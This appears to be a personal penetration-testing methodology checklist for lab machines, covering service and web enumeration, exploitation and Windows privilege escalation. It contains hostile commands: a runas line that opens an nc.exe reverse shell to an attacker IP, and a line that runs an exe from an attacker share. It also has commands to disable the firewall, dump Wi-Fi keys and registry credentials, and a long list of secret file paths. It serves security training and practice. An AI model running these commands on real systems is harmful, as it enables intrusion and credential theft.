---
cover: https://i.gifer.com/4xIr.gif
coverY: 0
---

# Bullet Proof Strategy

### Proofs

Linux

```
hostname && whoami && cat proof.txt && ip a 
```

Windows&#x20;

```
hostname && whoami.exe && type proof.txt && ipconfig /all
```

### Enumeration

#### Service Enumeration

{% embed url="https://github.com/The-Lynx-Team/OSCP/blob/main/Box%20template/recon_enum_methodology%F0%9F%9B%B0.md" %}

* [ ] Run autorecon
* [ ] Run rustscan
* [ ] MAKE A LIST OF EVERY ENTRY POINT.
* [ ] Start Enumerating Non-Web Services&#x20;
* [ ] For every port remember the principles of:&#x20;
* [ ] Checking Version:
  * [ ] Grab banner using netcat or telnet&#x20;
  * [ ] Search notes&#x20;
    * [ ] Cherry Tree
    * [ ] This Blog
    * [ ] Hacktricks
  * [ ] Searchsploit search
  * [ ] What is the purpose of this service?
    * [ ] Can we change password , users from other services around?
    * [ ] Can we modify information
    * [ ] can we read information ?&#x20;
    * [ ] Can we decrypt it?
  * [ ] Default credentials?
  * [ ] Brute force the service
    * [ ] Use nse scripts or maybe anyting.&#x20;
  * [ ] Any known vulnerability?
    * [ ] &#x20;Check [https://www.exploit-db.com/](https://www.exploit-db.com/)
    * [ ] &#x20;Check [https://www.cvedetails.com/](https://www.cvedetails.com/)
    * [ ] &#x20;Check [https://nvd.nist.gov/](https://nvd.nist.gov/)
    *   [ ] &#x20;Check on google

        ```
         site:github.com *Service version.release*
        ```
  * [ ] version + github + exploit search
  * [ ] google search
    * [ ] Every error message
    * [ ] Every PATH
    * [ ] Every parameter to find version
    * [ ] Every version of exploitdb
    * [ ] Every version of vuln
    * [ ] Every string from the banner grab
* [ ] Kerberos open?
  * [ ] kerbrute user enum
  * [ ] Aseproast
* [ ] SNMP
  * [ ] nmap
  * [ ] snmpwalk
  * [ ] &#x20;Find service and version
  * [ ] &#x20;Find known service bugs
  * [ ] &#x20;Find configuration issues
  * [ ] &#x20;Run nmap port scan / banner grabbing
  * [ ] &#x20;Google-Fu
    * [ ] &#x20;Every error message
    * [ ] &#x20;Every URL path
    * [ ] &#x20;Every paramenter to find versions/apps/bugs
  * [ ] &#x20;searchsploit every serivce
  * [ ] &#x20;Google
    * [ ] &#x20;Every version exploit db
    * [ ] &#x20;Every version vulnerability
  * [ ] Check running services
    * [ ] Google!
* [ ] SMTP
  * [ ] NMAP
  * [ ] Hacktricks
  * [ ] USERENUM
    * [ ] HYDRA SMTP ENUM
    * [ ] &#x20;Find service and version
    * [ ] &#x20;Find known service bugs
    * [ ] &#x20;Find configuration issues
    * [ ] &#x20;Run nmap port scan / banner grabbing
    * [ ] &#x20;Google-Fu
      * [ ] &#x20;Every error message
      * [ ] &#x20;Every URL path
      * [ ] &#x20;Every paramenter to find versions/apps/bugs
    * [ ] &#x20;searchsploit every serivce
    * [ ] &#x20;Google
      * [ ] &#x20;Every version exploit db
      * [ ] &#x20;Every version vulnerability
* [ ] DNS
  * [ ] autrecon manual
  * [ ] nslookup
  * [ ] dig axfr
* [ ] IRC
  * [ ] hexchat
* [ ] POP3
  * [ ] See if we can authenticate as a user
  * [ ] &#x20;"LIST"
  * [ ] retr \<numbers>
    * [ ] &#x20;Find service and version
    * [ ] &#x20;Find known service bugs
    * [ ] &#x20;Find configuration issues
    * [ ] &#x20;Run nmap port scan / banner grabbing
    * [ ] &#x20;Google-Fu
      * [ ] &#x20;Every error message
      * [ ] &#x20;Every URL path
      * [ ] &#x20;Every paramenter to find versions/apps/bugs
    * [ ] &#x20;searchsploit every serivce
    * [ ] &#x20;Google
      * [ ] &#x20;Every version exploit db
      * [ ] &#x20;Every version vulnerability
* [ ] Ident
  * [ ] Channel through different ports each time
    * [ ] ident-user-enum
* [ ] Enumerate Services with Null Sessions
  * [ ] LDAP
    * [ ] Grep Description
    * [ ] Look for unusual fields
    * [ ] Grep pwd
    * [ ] Grep Pwd
    * [ ] grep password&#x20;
    * [ ] grep Pass
    * [ ] grep pass
    * [ ] ldapsearch&#x20;
  * [ ] FTP
    * [ ] if unstable reset box
    * [ ] &#x20;Find service and version
    * [ ] &#x20;Find known service bugs
    * [ ] &#x20;Find configuration issues
    * [ ] &#x20;Run nmap port scan / banner grabbing
    * [ ] &#x20;Google-Fu
      * [ ] &#x20;Every error message
      * [ ] &#x20;Every URL path
      * [ ] &#x20;Every paramenter to find versions/apps/bugs
    * [ ] &#x20;searchsploit every serivce
    * [ ] &#x20;Google
      * [ ] &#x20;Every version exploit db
      * [ ] &#x20;Every version vulnerability
    * [ ] upload?
      * [ ] Identify where we are in the file system
        * [ ] Dont know?google!
          * [ ] Example /var/ftp/anon/\<directory-name-ifapplies>
    * [ ] Download recursively all ftp directories using wget
    * [ ] Change binary mode to upload exe
    * [ ] [https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
    * [ ] Configuration files
      * [ ] ftpusers
      * [ ] ftp.conf
      * [ ] proftpd.conf
      * [ ] filezilla users.xml
  * [ ] RPC
    * [ ] enumdomusers
      * [ ] make a list of users
    * [ ] enumprinters
  * [ ] SMB
    * [ ] Download Files
    * [ ] Mount&#x20;
      * [ ] Check for permissions smbcacls
    * [ ] &#x20;Find service and version
    * [ ] &#x20;Find known service bugs
    * [ ] &#x20;Find configuration issues
    * [ ] &#x20;Run nmap port scan / banner grabbing
    * [ ] &#x20;Google-Fu
      * [ ] &#x20;Every error message
      * [ ] &#x20;Every URL path
      * [ ] &#x20;Every paramenter to find versions/apps/bugs
    * [ ] &#x20;searchsploit every serivce
    * [ ] &#x20;Google
      * [ ] &#x20;Every version exploit db
      * [ ] &#x20;Every version vulnerability
  * [ ] REDIS
    * [ ] Check HACKTRICKS
    * [ ] &#x20;Find service and version
    * [ ] &#x20;Find known service bugs
    * [ ] &#x20;Find configuration issues
    * [ ] &#x20;Run nmap port scan / banner grabbing
    * [ ] &#x20;Google-Fu
      * [ ] &#x20;Every error message
      * [ ] &#x20;Every URL path
      * [ ] &#x20;Every paramenter to find versions/apps/bugs
    * [ ] &#x20;searchsploit every serivce
    * [ ] &#x20;Google
      * [ ] &#x20;Every version exploit db
      * [ ] &#x20;Every version vulnerability
    * [ ] DBS
    * [ ] Try PHP webshell if we have write access to the /var/www/html/ folder
    * [ ] Try grabbing SSH Keys or uploading them
    * [ ] Try uploading module.so if vulnerable version
  * [ ] Rsync
    * [ ] List shares
    * [ ] Download Share
    * [ ] Identify Where we are&#x20;
* [ ] If we do not know how to enumerate these services use hacktricks
* [ ] Identifying default credentials and password reusage:
  * [ ] Look up Version plus default credentials
  * [ ] Try admin:admin
  * [ ] Try admin:password
  * [ ] Try root:admin
  * [ ] Try root:password
  * [ ] Try root:root
  * [ ] Try boxname:admin,password
  * [ ] Try version or app name : app name
  * [ ] Try admin : no pass
  * [ ] Try root : no pass
  * [ ] Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret)
* [ ] Brute force
  * [ ] Use cewl to make a passlist if there is a webserver running
  * [ ] Use rockyou.txt if we know that there are users such as admin or root for those services&#x20;
  * [ ] If we found credentials
    * [ ] Rerun the bruteforcing&#x20;
* [ ] If we are able to find credentials through our enumeration then we rerun our enumeration
  * [ ] This mean that we will run every null session command with the credentials that we found or we will attempt EVERY vector with the credentials
    * [ ] LDAP
    * [ ] RPC
    * [ ] SMB
      * [ ] Download Files
      * [ ] Mount
        * [ ] Check upload permissions using smbcalcls
          * [ ] scf
          * [ ] hta
          * [ ] odt
      * [ ] If SMBPass Change was given to you use smbpasswd&#x20;
    * [ ] REDIS
      * [ ] Enumerate version
      * [ ] DBS
      * [ ] Try PHP webshell if we have write access to the /var/www/html/ folder
      * [ ] Try grabbing SSH Keys or uploading them
      * [ ] Try uploading module.so if vulnerable version
    * [ ] Kerberos based attacks
      * [ ] Kerberoasting
    * [ ] CME
      * [ ] WINRM
      * [ ] SMB
        * [ ] If SMBPass Change was given to you use smbpasswd
      * [ ] LDAP
        * [ ] ldapdomaindump
        * [ ] redo the same shit from initial time
    * [ ] Files of importance when looking out for this shares
    * [ ] <mark style="color:red;">Regardless NO MATTER WHAT YOU FIND YOU WILL LOOK IT UP ON GOOGLE!</mark>
    * [ ] <mark style="color:red;"></mark>[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/code-review-tools](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/code-review-tools)
      * [ ] pdfs
        * [ ] exiftool
      * [ ] Credentials for mysql, postgress, mssql
        * [ ] Look for string "sa"
      * [ ] exe
        * [ ] buffer overflow
      * [ ] pngs
        * [ ] exiftool
      * [ ] conf
      * [ ] config
      * [ ] xml
      * [ ] Look for the file specifically on google.com and how to decrypt them
        * [ ] Groups.xml
          * [ ] gpp decrypt
        * [ ] VNC&#x20;
          * [ ] vncpwd
      * [ ] db
        * [ ] sqlite
      * [ ] cert files for evil winrm
      * [ ] pfx files for evil winrm&#x20;
      * [ ] zip
        * [ ] zip2john
      * [ ] 7z
        * [ ] 7z2john
      * [ ] pdf
        * [ ] pdfcrack
      * [ ] Doc
        * [ ] office2john
      * [ ] .net file&#x20;
        * [ ] dnspy&#x20;

#### Web Enumeration

* [ ] autorecon
* [ ] Rustscan
  * [ ] Check for potential auth owner
  * [ ] Take note of the app&#x20;
    * [ ] node.js
    * [ ] werkzeug
    * [ ] IIS
* [ ] nikto scan
* [ ] HTTPS&#x20;
  * [ ] Look at certificates, check brainfuck for this&#x20;
  * [ ] sslscan&#x20;
  * [ ] nmap heatbleed vuln
* [ ] If there is proxy
  * [ ] use spose to enumerate behind the proxy
* [ ] Navigate to site
  * [ ] Source Code inspection
    * [ ] Look for APIs
    * [ ] href
    * [ ] check comments
    * [ ] Hidden values
    * [ ] Weird Code
    * [ ] Passwords
    * [ ] Download Files
      * [ ] Exiftool
  * [ ] Enumerate version of CMS, about page, versions
    * [ ] Searchsploit
    * [ ] &#x20;Find service and version
    * [ ] &#x20;Find known service bugs
    * [ ] &#x20;Find configuration issues
    * [ ] &#x20;Run nmap port scan / banner grabbing
    * [ ] &#x20;Google-Fu
      * [ ] &#x20;Every error message
      * [ ] &#x20;Every URL path
      * [ ] &#x20;Every paramenter to find versions/apps/bugs
    * [ ] &#x20;searchsploit every serivce
    * [ ] &#x20;Google
      * [ ] &#x20;Every version exploit db
      * [ ] &#x20;Every version vulnerability
    * [ ] Google
      * [ ] If Versions were identified such as&#x20;
        * [ ] Wordpress
          * [ ] wpscan
            * [ ] Check plugins for vulnerabiliies
          * [ ] wpscan brute
        * [ ] Droopal
          * [ ] Droopescan&#x20;
          * [ ] Check changelog.txt for version
          * [ ] Find endpoint\_path
          * [ ] Attack vectors
            * [ ] Drupal 7.x Module Services Rce
            * [ ] Drupalgeddon2
            * [ ] DRUPALGEDDON3
        * [ ] Jenkins
          * [ ] Default Creds
            * [ ] Create new User
          * [ ] Identify version and exploits for them&#x20;
          * [ ] Groovy Script reverse shell
          * [ ] Create new job
            * [ ] If we can build
            * [ ] Else  use curl or cronjob method to execute the commands
            * [ ] Try to get reverse shell&#x20;
              * [ ] Otherwise hunt down for the master.key and other files needed for decryption
        * [ ] Tomcat&#x20;
          * [ ] Nikto scan&#x20;
          * [ ] Search vulnerabilities via version number
            * [ ] Look for /manager
            * [ ] Use default credential list&#x20;
              * [ ] Upload war file to get reverse shell
        * [ ] WebDav&#x20;
          * [ ] Default Creds
          * [ ] Spray
          * [ ] Other Creds
            * [ ] Use cadaver for upload
              * [ ] aspx
        * [ ] phpMyAdmin
          * [ ] Try Default Creds
            * [ ] root:
            * [ ] root:password
              * [ ] Once in we can upload a shell using a sql query&#x20;
  * [ ] Enumerate for usernames, emails, user info
    * [ ] Make a userlist using username-anarchy and other tool
      * [ ] Use these against any service or authentication method.
        * [ ] Make a passlist out of cewl&#x20;
        * [ ] username:username
        * [ ] username:password
        * [ ] Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret)
  * [ ] Enumerate for Upload&#x20;
    * [ ] Enumerate what extentions we can use to upload
    * [ ] Pair this with FTP, REDIS, and other forms of upload capability.

<mark style="color:red;">AT THIS POINT THIS IS WHERE IT MATTERS TO TAKE INTO ACCOUNT WHAT THE VERSION AND TECHNOLOGY BEHIND THE APPLICATION IS, IF THERE IS NO IDENTIFABLE EXPLOIT THAT MEANS THAT THIS IS A WEBSITE MADE BY THE CREATORS OF THE BOX. WE HAVE TO TAKE INTO ACCOUNT NOW THAT WE COULD POSSIBLY HAVE SQLI, CODE INJECTION.  OUR PAYLOADS HAVE TO MATCH THE TECHNOLOGY BEHIND THE WEBSITE.</mark>

* [ ] &#x20;Logical reasoning
  * [ ] &#x20;Look at the application from a bad guy perspective, what does it do? what is the most valuable part? Some applications will value things more than others, for example a premium website might be more concerned about users being able to bypass the pay wall than they are of say cross-site scripting
  * [ ] &#x20;Look at the application logic too, how is business conducted?
* [ ] 401 OR 403? Try bypassing that&#x20;
  * [ ] Use hacktricks for this, I also have a script that does it for you.
* [ ] nikto&#x20;
  * [ ] google everything that this returns
    * [ ] there was a box about the api that was exploitable by looking it up on nikto scan (Restack API)
* [ ] Enumerate directories&#x20;
  * [ ] dirsearch
    * [ ] /boxname/
  * [ ] gobuster
  * [ ] if cgi-bin folder was found (shellshock)
    * [ ] /cgi-bin/ dirb scan
    * [ ] dirb scan normal
  * [ ] Rerun initial enum for this such as source code inspection
  * [ ] Enumerate hidden params
    * [ ] arjun
    * [ ] wfuzz
    * [ ] ffuff&#x20;
    * [ ] Guess parameters. If there's a POST forgot\_pass.php with an email param, try `GET /forgot_pass.php?email=%0aid.`
  * [ ] Enumerate parameters for RFI, and LFI
    * [ ] Remember relativity and using LFI to expose other services that we could authenticate as.&#x20;
    * [ ] [https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)&#x20;
    * [ ] Check for RCE methods, like every single one of them.
  * [ ] Enumerate SSRF if there is some sort of browser.&#x20;
    * [ ] Capture hashes via responder
  * [ ] Every parameter or input has to be checked for sql injection
    * [ ] Try enabling the shells depending on the database that is open
    * [ ] otherwise haha xd try to enumerate tables and the whole jargon
  * [ ] Play with <mark style="color:red;">post and get</mark> requests, this could lead to something displaying&#x20;
    * [ ] Google everything&#x20;
    * [ ] This can be done with curl and BurpSuite
    * [ ] Guess post parameters based on the output, check the werkzeug section of the blog
  * [ ] Play with weak cookies and parameters&#x20;
    * [ ] Look for weak encryption maybe we could decrypt these into passwords and mess with them by changing them to admin.&#x20;
* [ ] Log in forms
  * [ ] default creds google
  * [ ] cewl to make passlist&#x20;
  * [ ] cewl to make user list
  * [ ] version:version
  * [ ] combine them both
  * [ ] authetication bypass
  * [ ] boxname:boxname
  * [ ] admin:version
  * [ ] name:version
  * [ ] php type juggling&#x20;
  * [ ] Credentials somewhere else in the box.
  * [ ] Bruteforce

### Exploitation

<mark style="color:red;">THESE ARE THE THREE PRINCIPLES OF GETTING IN. THERE IS EITHER A VULNERABLE SERVICE, THIS MAYBE HAS TO BE CHAINED WITH ANOTHER VULNERABILITY. THEN THERE IS PASSWORD SPRAYING, THIS IS BASICALLY CONSITUTES TO DEFAULT CREDS, PASSWORD RESUSAGE, AND THE LAST IS BRUTEFORCING</mark>&#x20;

#### Vulnerable services

Any known vulnerability?

* [ ] &#x20;Check [https://www.exploit-db.com/](https://www.exploit-db.com/)
* [ ] &#x20;Check [https://www.cvedetails.com/](https://www.cvedetails.com/)
* [ ] &#x20;Check [https://nvd.nist.gov/](https://nvd.nist.gov/)
*   [ ] &#x20;Check on google

    ```
     site:github.com *Service version.release*
    ```
* [ ] We do not have version? But exploits avaliable&#x20;
  * [ ] Prioritize RCE exploits
  * [ ] Try THEM ALL!!!
  * [ ] and redo the above
* [ ] IF WE HAVE CODE EXECUTION
  * [ ] Attempt to get reverse shells
    * [ ] if a technique does not work, do every single fucking reverse shell
      * [ ] python, nc , in every motherfucking way [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
      * [ ] Troubleshoot the exploit maybe the command needs a certain syntax look at the methodology section of the blog in exploitation
      * [ ] Also play with this remember the mongodb exploit from the labs.
      * [ ] Also try bash -c instead of just the normal bash -i reverse shell.
* [ ] ALWAYS USE AND CHANNEL THROUGH OPEN PORTS FOR THE REVERSE SHELL
* [ ] if we do get code execution but no reverse shell because of whatever firewall, our best choice is to look if we can output files in a way where we can use them against other services, these could be used to gain access and uploading shit.&#x20;
* [ ] THINK ABOUT SITUATIONAL AWARENESS. Where can we upload? can we use these files to our advantage, remember the thing about redis.
* [ ] Did we get credentials for any database that are valid ?
  * [ ] Check RCE methods&#x20;
  * [ ] Enumerate the database

#### Active Directory Based Attacks

* [ ] If base
* [ ] d on our enumeration we found some sort of userlist
  * [ ] Make a list with these with different naming conventions
  * [ ] Validate these users with kerbrute.&#x20;
    * [ ] If the users are valid
      * [ ] ASEPROAST
      * [ ] Make a passlist with how we usually do
        * [ ] use cewl if there is a webserver&#x20;
        * [ ] user:user
        * [ ] user:password
        * [ ] user:''
        * [ ] user:boxname
        * [ ] Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret)
      * [ ] Validate these creds with CRackmapexec
        * [ ] ldap
        * [ ] smb
          * [ ] If we get pwned!
            * [ ] psexec
        * [ ] winrm
          * [ ] However Rerun all enumeration from before if we find these are valid
      * [ ] Kebroast

#### Password Reusage

#### Spraying

<mark style="color:red;">Same principle as other things discussed, we make a list out of everything we see and every username, name, version is valuable to us.</mark>&#x20;

### Privilege Escalation

{% embed url="https://github.com/The-Lynx-Team/OSCP/blob/main/Box%20template/privesc_methodology%F0%9F%AA%82.md" %}

#### Windows

* [ ] Enumerate current user and its permissions&#x20;
*   [ ] Check the privileges&#x20;

    * [ ] Impersoante
    * [ ] SeLoadDriver
    * [ ] SeRestore

    ```
     SeImpersonatePrivilege
     SeAssignPrimaryPrivilege
     SeTcbPrivilege
     SeBackupPrivilege
     SeRestorePrivilege
     SeCreateTokenPrivilege
     SeLoadDriverPrivilege
     SeTakeOwnershipPrivilege
     SeDebugPrivilege
    ```
* [ ] Transfer winpeas
* [ ] Transfer PowerUp
* [ ] Seatbelt
* [ ] Sherlock
* [ ] Rubeus
* [ ] SharpHound
*   [ ] &#x20;General users enum

    ```
     whoami /all
     net users %username%
     net users
     Get-WmiObject -Class Win32\_UserAccount
     Get-LocalUser | ft Name,Enabled,LastLogon
     Get-ChildItem C:\\Users -Force | select Name
     Get-LocalGroupMember Administrators | ft Name, PrincipalSource
    ```
*   [ ] &#x20;General groups enum

    ```
     net localgroup
     net localgroup Administrators
    ```
*   [ ] &#x20;Check if current user has these tokens:

    ```
     SeImpersonatePrivilege
     SeAssignPrimaryPrivilege
     SeTcbPrivilege
     SeBackupPrivilege
     SeRestorePrivilege
     SeCreateTokenPrivilege
     SeLoadDriverPrivilege
     SeTakeOwnershipPrivilege
     SeDebugPrivilege
    ```

#### System Enumeration

*   [ ] &#x20;Windows version

    ```
     systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    ```
*   [ ] &#x20;Installed patches and updates

    ```
     wmic qfe
    ```
*   [ ] &#x20;Architecture

    ```
     wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
    ```
*   [ ] &#x20;Environment variables

    ```
     set
     Get-ChildItem Env: | ft Key,Value
    ```
*   [ ] &#x20;Drives

    ```
     wmic logicaldisk get caption || fsutil fsinfo drives
     wmic logicaldisk get caption,description,providername
     Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\\FileSystem"}| ft Name,Root
    ```

#### Network Enumeration

ARE THE RUNNIGN SERVICES RUNNING AS OTHER USERS? CAN WE MODIFY THE WEBSTE MAYBE BY PASTING A PHP FILE THAT RUNS AS THE USER WHO HOSTS THE WEBSITE

TRANSFER PLINK

*   [ ] &#x20;List all NICs, IP and DNS

    ```
     ipconfig /all
     Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
     Get-DnsClientServerAddress -AddressFamily IPv4 | ft
    ```
*   [ ] &#x20;List routing table

    ```
     route print
     Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
    ```
*   [ ] &#x20;List ARP table

    ```
     arp -A
     Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
    ```
*   [ ] &#x20;List current connections

    ```
     netstat -ano
    ```
*   [ ] &#x20;List current connections correlated to running service (requires elevated privs)

    ```
     netstat -bona
    ```
*   [ ] &#x20;List firewall state and config

    ```
     netsh advfirewall firewall dump
     netsh firewall show state
     netsh firewall show config
    ```
*   [ ] &#x20;List firewall's blocked ports

    ```
     $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
    ```
*   [ ] &#x20;Disable firewall

    ```
     netsh advfirewall set allprofiles state off
     netsh firewall set opmode disable
    ```
*   [ ] &#x20;List network shares

    ```
     net share
     powershell Find-DomainShare -ComputerDomain domain.local
    ```
*   [ ] &#x20;SNMP config

    ```
     reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s
     Get-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse
    ```

#### Credential Access

*   [ ] &#x20;Go from **medium mandatory level** to **high mandatory level**

    ```
     # using powershell
     powershell.exe Start-Process cmd.exe -Verb runAs
    ```
*   [ ] &#x20;**TRY KNOWN PASSWORDS!**

    ```
     # check also with runas
     C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
    ```
*   [ ] &#x20;Creds from config files (Try different words e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth):

    ```
     dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
     findstr /si /m password *.xml *.ini *.txt
    ```
* [ ] &#x20;Creds from local DBs
*   [ ] &#x20;Creds from Windows Vault

    ```
     cmdkey /list
     # if found
     runas /savecred /user:WORKGROUP\Administrator "\\attacker-ip\SHARE\welcome.exe"
    ```
*   [ ] &#x20;Creds from Registry

    ```
     reg query HKLM /f pass /t REG_SZ /s
     reg query HKCU /f pass /t REG_SZ /s
     
     reg query HKLM /f password /t REG_SZ /s
     reg query HKCU /f password /t REG_SZ /s
     
     # Windows Autologin
     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
      
      # SNMP parameters
     reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
     
     # Putty credentials
     reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
     reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
     
     # VNC credentials
     reg query "HKCU\Software\ORL\WinVNC3\Password"
     reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password
     
     ## OpenSSH credentials
     reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
    ```
*   [ ] &#x20;Creds from Unattend or Sysprep Files

    ```
     c:\sysprep.inf
     c:\sysprep\sysprep.xml
     %WINDIR%\Panther\Unattend\Unattend*.xml
     %WINDIR%\Panther\Unattend*.xml
    ```
*   [ ] &#x20;Creds from Log Files

    ```
     dir /s /b /p *access*.log* == *.log
    ```
*   [ ] &#x20;Creds from IIS web config

    ```
     Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
     Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
     	
     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
     C:\inetpub\wwwroot\web.config
    ```
*   [ ] &#x20;Check other possible interesting files

    ```
     dir c:*vnc.ini /s /b
     dir c:*ultravnc.ini /s /b
     %SYSTEMDRIVE%\pagefile.sys
     %WINDIR%\debug\NetSetup.log
     %WINDIR%\repair\sam
     %WINDIR%\repair\system
     %WINDIR%\repair\software, %WINDIR%\repair\security
     %WINDIR%\iis6.log
     %WINDIR%\system32\config\AppEvent.Evt
     %WINDIR%\system32\config\SecEvent.Evt
     %WINDIR%\system32\config\default.sav
     %WINDIR%\system32\config\security.sav
     %WINDIR%\system32\config\software.sav
     %WINDIR%\system32\config\system.sav
     %WINDIR%\system32\CCM\logs\*.log
     %USERPROFILE%\ntuser.dat
     %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
     %WINDIR%\System32\drivers\etc\hosts
     C:\ProgramData\Configs\*
     C:\Program Files\Windows PowerShell\*vnc.ini, ultravnc.ini, \*vnc\*
     web.config
     php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
     SiteList.xml #McAfee
     ConsoleHost_history.txt #PS-History
     *.gpg
     *.pgp
     *config*.php
     elasticsearch.y*ml
     kibana.y*ml
     *.p12
     *.der
     *.csr
     *.cer
     known_hosts
     id_rsa
     id_dsa
     *.ovpn
     anaconda-ks.cfg
     hostapd.conf
     rsyncd.conf
     cesi.conf
     supervisord.conf
     tomcat-users.xml
     *.kdbx
     KeePass.config
     Ntds.dit
     SAM
     SYSTEM
     FreeSSHDservice.ini
     access.log
     error.log
     server.xml
     setupinfo
     setupinfo.bak
     key3.db #Firefox
     key4.db #Firefox
     places.sqlite #Firefox
     "Login Data" #Chrome
     Cookies #Chrome
     Bookmarks #Chrome
     History #Chrome
     TypedURLsTime #IE
     TypedURLs #IE
    ```
*   [ ] &#x20;Creds from WiFi

    ```
     # 1. Find AP SSID
     netsh wlan show profile
     # 2. Get cleartext password
     netsh wlan show profile <SSID> key=clear
     # OR
     # Go hard and grab 'em all
     cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
    ```
*   [ ] &#x20;Creds from sticky notes app

    ```
     C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
    ```
*   [ ] &#x20;Creds stored in services

    ```
     # SessionGopher to grab PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP
     # https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
     Import-Module path\to\SessionGopher.ps1;
     Invoke-SessionGopher -AllDomain -o
     Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
    ```
*   [ ] &#x20;Creds from Powershell History

    ```
     type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
     type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
     type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
     cat (Get-PSReadlineOption).HistorySavePath
     cat (Get-PSReadlineOption).HistorySavePath | sls passw
    ```
*   [ ] &#x20;Creds from [alternate data stream](https://owasp.org/www-community/attacks/Windows\_alternate\_data\_stream)

    ```
     Get-Item -path <filename> -Stream *
     Get-Content -path <filename> -Stream <keyword>
    ```
*   [ ] &#x20;SAM & SYSTEM bak

    ```
     # Usually %SYSTEMROOT% = C:\Windows
     %SYSTEMROOT%\repair\SAM
     %SYSTEMROOT%\System32\config\RegBack\SAM
     %SYSTEMROOT%\System32\config\SAM
     %SYSTEMROOT%\repair\system
     %SYSTEMROOT%\System32\config\SYSTEM
     %SYSTEMROOT%\System32\config\RegBack\system
    ```
*   [ ] &#x20;Cloud credentials

    ```
     # From user home
     .aws\credentials
     AppData\Roaming\gcloud\credentials.db
     AppData\Roaming\gcloud\legacy_credentials
     AppData\Roaming\gcloud\access_tokens.db
     .azure\accessTokens.json
     .azure\azureProfile.json
    ```
*   [ ] &#x20;Cached [GPP password](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

    ```
     # Before Vista look inside
     C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history
     # After Vista look inside
     C:\ProgramData\Microsoft\Group Policy\history
     # Look for
     Groups.xml
     Services.xml
     Scheduledtasks.xml
     DataSources.xml
     Printers.xml
     Drives.xml
     
     # Decrypt the passwords with
     gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
    ```
*   [ ] &#x20;Saved RDP connections

    ```
     HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
     HKCU\Software\Microsoft\Terminal Server Client\Servers\
    ```
*   [ ] &#x20;Remote desktop credential manager

    ```
     %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
    ```
*   [ ] &#x20;SCClient \ SCCM

    ```
     # Check if the retrieved sotfwares are vulnerable to DLL Sideloading
     # https://github.com/enjoiz/Privesc
     $result = Get-WmiObject -Namespace "root\\ccm\\clientSDK" -Class CCM\_Application -Property * | select Name,SoftwareVersion
     if ($result) { $result }
     else { Write "Not Installed." }
    ```
* [ ] &#x20;Check recycle bin

#### Exploit

* [ ] &#x20;Services running on localhost
*   [ ] &#x20;Kernel version

    ```
     # List of exploits kernel https://github.com/SecWiki/windows-kernel-exploits
     # to cross compile a program from Kali
     $ i586-mingw32msvc-gcc -o adduser.exe useradd.c
    ```
* [ ] &#x20;Software versions
* [ ] &#x20;Service versions

#### Misconfiguration

* [ ] &#x20;Services
* [ ] Can we restart the machine?
* [ ] Can we start and stop the service?
